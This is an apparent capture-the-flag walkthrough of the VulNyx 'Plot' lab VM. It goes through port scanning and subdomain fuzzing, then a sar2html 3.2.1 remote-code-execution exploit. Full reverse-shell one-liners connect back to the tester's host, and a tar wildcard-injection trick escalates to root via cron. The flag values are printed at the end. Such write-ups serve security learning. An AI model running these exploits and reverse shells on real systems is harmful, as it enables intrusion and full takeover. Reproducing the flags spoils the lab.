# VulNyx - Plot

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -T4 192.168.100.183
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-21 20:43 +07
Nmap scan report for plot.lan (192.168.100.183)
Host is up (0.0091s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
MAC Address: 08:00:27:68:0F:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.42 seconds
```
There are 2 open ports:
- Port 22/SSH: OpenSSH 8.4p1 
- Port 80/HTTP: Apache httpd 2.4.56

#### Nikto
Use `nikto` to scan web vulnerablities in the target machine address.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nikto -C all -h 192.168.100.183  
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.100.183
+ Target Hostname:    192.168.100.183
+ Target Port:        80
+ Start Time:         2026-04-21 20:46:20 (GMT7)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'x-custom-header' found, with contents: pl0t.nyx.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 60205730d2279, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ 26640 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2026-04-21 20:50:57 (GMT7) (277 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Result: Detected strange Header: `x-custom-header: pl0t.nyx` -> could be an internal domain name.

#### Fuzzing (Discover Subdomains)
Open the system configuration file `/etc/hosts` on Linux, used to map hostname -> local IP address to add `pl0t.nyx` pointing to IP `192.168.100.183`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ sudo nano /etc/hosts
```
![etc/hosts](/walkthroughs/vulnyx/low-difficulty/plot/etc-hosts.png)

Use `ffuf` to brute-force find subdomains or directory.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 10701 -H "Host: FUZZ.pl0t.nyx" -u "http://pl0t.nyx"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pl0t.nyx
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.pl0t.nyx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 10701
________________________________________________
:: Progress: [0/114442] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0:: Progress: [134/114442] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [201/114442] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [296/114442] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [357/114442] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [448/114442] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:
sar                     [Status: 200, Size: 4812, Words: 494, Lines: 87, Duration: 11ms]
:: Progress: [3742/114442] :: Job [1/1] :: 843 req/sec :: Duration: [0:00:18] :: Errors::
```
We found subdomain `sar.pl0t.nyx` returning HTTP 200, size difference. This could be a hidden subdomain containing another application or service.

![sar-web](/walkthroughs/vulnyx/low-difficulty/plot/sar-web.png)
The `sar.pl0t.nyx` subdomain that we access in the browser is running an application called `sar2html` version 3.2.1.

### Shell
Use `searchsploit` to search for published exploits for `sar2html (3.2.1)`.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ searchsploit sar2html 3.2.1
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution      | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution          | php/webapps/47204.txt
--------------------------------------------------- ---------------------------------

┌──(dungcngo㉿kali)-[/tmp]
└─$ searchsploit -m 49344 
  Exploit: sar2html 3.2.1 - 'plot' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49344
     Path: /usr/share/exploitdb/exploits/php/webapps/49344.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /tmp/49344.py

```
`sar2html version 3.2.1` has a serious vulnerability that allows romote command execution (RCE) via the `plot` parameter.

We have obtained a PoC exploit `49344.py` for the RCE vulnerability in `sar2html 3.2.1`, which can be used for testing or exploitation.

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls
49344.py
config-err-BejxIN
systemd-private-ac12c86baf904c15857af4c27aba01d9-colord.service-r2j1iS
systemd-private-ac12c86baf904c15857af4c27aba01d9-haveged.service-AmxI2c
systemd-private-ac12c86baf904c15857af4c27aba01d9-ModemManager.service-TSckN5
systemd-private-ac12c86baf904c15857af4c27aba01d9-pcscd.service-TxeyCV
systemd-private-ac12c86baf904c15857af4c27aba01d9-polkit.service-4Hxpre
systemd-private-ac12c86baf904c15857af4c27aba01d9-systemd-logind.service-tXVCHh
systemd-private-ac12c86baf904c15857af4c27aba01d9-upower.service-X4BaSC

┌──(dungcngo㉿kali)-[/tmp]
└─$ python3 49344.py
Enter The url => http://sar.pl0t.nyx
Command => whoami
HPUX
Linux
SunOS
www-data

Command => 
```
Run the Python exploit file `49344.py` that was previously copied from `searchsploit`.As the result, we have successfully executed the remote command on the target server, and the web server process is running under user `www-data`.

Open a listenning socket on port 443 at the Kali machine.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443
listening on [any] 443 ...
```
On remote command, we run the reverse shell script written in python.
```bash
Command => whoami
HPUX
Linux
SunOS
www-data

Command => python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("192.168.100.172",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh", "-i"]);'

```
We will receive a remote shell on the Kali machine.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.100.172] from (UNKNOWN) [192.168.100.183] 58372
/bin/sh: 0: can't access tty; job control turned off
$ id ; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
plot
```

### Privilege Escalation
We download the `pspy64` tool on the Kali machine, then open a simple web server on port 80.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
....

┌──(dungcngo㉿kali)-[/tmp]
└─$ ls
49344.py
config-err-BejxIN
pspy64


┌──(dungcngo㉿kali)-[/tmp]
└─$ python -m http.server 80                              
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
So, the target machine can download `pspy64` from the Kali machine to the `/tmp` directory. Then, we change the file permission so that it is executed as a program.
```bash
www-data@plot:/var/www/vhost$ cd /tmp   
cd /tmp

www-data@plot:/tmp$ wget http://192.168.100.172/pspy64
wget http://192.168.100.172/pspy64
--2026-04-21 16:41:49--  http://192.168.100.172/pspy64
Connecting to 192.168.100.172:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  --.-KB/s    in 0.1s    

2026-04-21 16:41:49 (28.6 MB/s) - ‘pspy64’ saved [3104768/3104768]

www-data@plot:/tmp$ ls
ls
pspy64

www-data@plot:/tmp$ chmod +x pspy64
chmod +x pspy64

www-data@plot:/tmp$ ls -la
ls -la
total 3040
drwxrwxrwt  2 root     root        4096 Apr 21 16:41 .
drwxr-xr-x 18 root     root        4096 Aug  3  2023 ..
-rwxr-xr-x  1 www-data www-data 3104768 Jan 17  2023 pspy64
```

We run `pspy64` and save the results to `pspy.txt` then run `cat pspy.txt` to observe the process and cron jobs on the target machine without needing `root` permisison. 
```bash
www-data@plot:/tmp$ cat pspy.txt
cat pspy.txt
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/04/21 16:44:38 CMD: UID=33    PID=1794   | ./pspy64 
2026/04/21 16:44:38 CMD: UID=0     PID=1762   | 
2026/04/21 16:44:38 CMD: UID=0     PID=1698   | 
2026/04/21 16:44:38 CMD: UID=0     PID=1675   | 
2026/04/21 16:44:38 CMD: UID=33    PID=1662   | /bin/bash 
2026/04/21 16:44:38 CMD: UID=33    PID=1661   | python3 -c import pty;pty.spawn("/bin/bash")                                                                              
2026/04/21 16:44:38 CMD: UID=33    PID=1650   | /bin/sh -i 
2026/04/21 16:44:38 CMD: UID=33    PID=1649   | python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("192.168.100.172",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh", "-i"]);                                                         
2026/04/21 16:44:38 CMD: UID=33    PID=1629   | sh -c ./sar2html -r ;python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("192.168.100.172",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh", "-i"]);'                                  
2026/04/21 16:44:38 CMD: UID=0     PID=1574   | 
2026/04/21 16:44:38 CMD: UID=0     PID=1563   | 
2026/04/21 16:44:38 CMD: UID=0     PID=1462   | 
2026/04/21 16:44:38 CMD: UID=33    PID=1430   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1391   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1342   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1330   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1314   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1308   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1301   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1300   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1274   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=33    PID=1268   | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=0     PID=436    | /usr/sbin/apache2 -k start 
2026/04/21 16:44:38 CMD: UID=0     PID=422    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups                                                                   
2026/04/21 16:44:38 CMD: UID=0     PID=357    | /sbin/agetty -o -p -- \u --noclear tty1 linux                                                                             
2026/04/21 16:44:38 CMD: UID=0     PID=316    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                              
2026/04/21 16:44:38 CMD: UID=0     PID=303    | /lib/systemd/systemd-logind 
2026/04/21 16:44:38 CMD: UID=0     PID=300    | /usr/sbin/rsyslogd -n -iNONE 
2026/04/21 16:44:38 CMD: UID=103   PID=292    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                  
2026/04/21 16:44:38 CMD: UID=0     PID=291    | /usr/sbin/cron -f 
2026/04/21 16:44:38 CMD: UID=0     PID=280    | 
2026/04/21 16:44:38 CMD: UID=0     PID=276    | 
2026/04/21 16:44:38 CMD: UID=0     PID=273    | 
2026/04/21 16:44:38 CMD: UID=0     PID=271    | 
2026/04/21 16:44:38 CMD: UID=0     PID=269    | 
2026/04/21 16:44:38 CMD: UID=0     PID=266    | 
2026/04/21 16:44:38 CMD: UID=0     PID=265    | 
2026/04/21 16:44:38 CMD: UID=0     PID=264    | 
2026/04/21 16:44:38 CMD: UID=0     PID=263    | 
2026/04/21 16:44:38 CMD: UID=0     PID=260    | 
2026/04/21 16:44:38 CMD: UID=0     PID=246    | 
2026/04/21 16:44:38 CMD: UID=104   PID=232    | /lib/systemd/systemd-timesyncd 
2026/04/21 16:44:38 CMD: UID=0     PID=207    | /lib/systemd/systemd-udevd 
2026/04/21 16:44:38 CMD: UID=0     PID=183    | /lib/systemd/systemd-journald 
2026/04/21 16:44:38 CMD: UID=0     PID=149    | 
2026/04/21 16:44:38 CMD: UID=0     PID=148    | 
2026/04/21 16:44:38 CMD: UID=0     PID=111    | 
2026/04/21 16:44:38 CMD: UID=0     PID=110    | 
2026/04/21 16:44:38 CMD: UID=0     PID=109    | 
2026/04/21 16:44:38 CMD: UID=0     PID=108    | 
2026/04/21 16:44:38 CMD: UID=0     PID=107    | 
2026/04/21 16:44:38 CMD: UID=0     PID=106    | 
2026/04/21 16:44:38 CMD: UID=0     PID=105    | 
2026/04/21 16:44:38 CMD: UID=0     PID=68     | 
2026/04/21 16:44:38 CMD: UID=0     PID=67     | 
2026/04/21 16:44:38 CMD: UID=0     PID=64     | 
2026/04/21 16:44:38 CMD: UID=0     PID=54     | 
2026/04/21 16:44:38 CMD: UID=0     PID=53     | 
2026/04/21 16:44:38 CMD: UID=0     PID=52     | 
2026/04/21 16:44:38 CMD: UID=0     PID=51     | 
2026/04/21 16:44:38 CMD: UID=0     PID=48     | 
2026/04/21 16:44:38 CMD: UID=0     PID=47     | 
2026/04/21 16:44:38 CMD: UID=0     PID=46     | 
2026/04/21 16:44:38 CMD: UID=0     PID=45     | 
2026/04/21 16:44:38 CMD: UID=0     PID=44     | 
2026/04/21 16:44:38 CMD: UID=0     PID=43     | 
2026/04/21 16:44:38 CMD: UID=0     PID=25     | 
2026/04/21 16:44:38 CMD: UID=0     PID=24     | 
2026/04/21 16:44:38 CMD: UID=0     PID=23     | 
2026/04/21 16:44:38 CMD: UID=0     PID=22     | 
2026/04/21 16:44:38 CMD: UID=0     PID=21     | 
2026/04/21 16:44:38 CMD: UID=0     PID=20     | 
2026/04/21 16:44:38 CMD: UID=0     PID=19     | 
2026/04/21 16:44:38 CMD: UID=0     PID=18     | 
2026/04/21 16:44:38 CMD: UID=0     PID=17     | 
2026/04/21 16:44:38 CMD: UID=0     PID=15     | 
2026/04/21 16:44:38 CMD: UID=0     PID=13     | 
2026/04/21 16:44:38 CMD: UID=0     PID=12     | 
2026/04/21 16:44:38 CMD: UID=0     PID=11     | 
2026/04/21 16:44:38 CMD: UID=0     PID=10     | 
2026/04/21 16:44:38 CMD: UID=0     PID=9      | 
2026/04/21 16:44:38 CMD: UID=0     PID=8      | 
2026/04/21 16:44:38 CMD: UID=0     PID=6      | 
2026/04/21 16:44:38 CMD: UID=0     PID=4      | 
2026/04/21 16:44:38 CMD: UID=0     PID=3      | 
2026/04/21 16:44:38 CMD: UID=0     PID=2      | 
2026/04/21 16:44:38 CMD: UID=0     PID=1      | /sbin/init 
2026/04/21 16:44:59 CMD: UID=0     PID=1803   | 
2026/04/21 16:45:01 CMD: UID=0     PID=1804   | /usr/sbin/CRON -f 
2026/04/21 16:45:01 CMD: UID=0     PID=1805   | /usr/sbin/CRON -f 
2026/04/21 16:45:01 CMD: UID=0     PID=1806   | /bin/sh -c cd /var/www/html && tar -zcf /var/backups/serve.tgz *                                                          
2026/04/21 16:45:01 CMD: UID=0     PID=1807   | tar -zcf /var/backups/serve.tgz index.html                                                                                
2026/04/21 16:45:01 CMD: UID=0     PID=1808   | /bin/sh -c gzip 
2026/04/21 16:45:44 CMD: UID=33    PID=1809   | /bin/bash 
```
We detect a cronjob running as `root`, this is usually an opportunity for escalation of privilege: if content in `var/www/html` can be edited.

Use the following command serquence to escalate privilege taking advantage of cronjob `tar` running as `root`.
```bash
www-data@plot:/var/www/html$ echo "" > " --checkpoint-action=exec=sh reverse-shell.sh"
www-data@plot:/var/www/html$ echo "" > --checkpoint=1
www-data@plot:/var/www/html$ nano reverse-shell.sh 
www-data@plot:/var/www/html$ chmod +x reverse-shell.sh 
```
![reverse-shell](/walkthroughs/vulnyx/low-difficulty/plot/reverse-shell.png)

Open socket listenner in Kali linux port 443 and run `cat reverse-shell.sh` in target machine.

```bash
www-data@plot:/var/www/html$ cat reverse-shell.sh 
#!/bin/bash
nc -c /bin/bash 192.168.100.172 443
```
We have reverse shell from the target machine, elevated it to `root`, and improved the shell to be fully interactive.
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.100.172] from (UNKNOWN) [192.168.100.183] 52326
whoami
root
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@plot:/var/www/html# 
```
#### Flags
```bash
root@plot:~# find / -name root.txt -o -name user.txt | xargs cat
find / -name root.txt -o -name user.txt | xargs cat
f4ad483086126d8d33aef2c0f8657b12
14751e2f45679b48adc9ad305437223d
```

***You are welcome!***
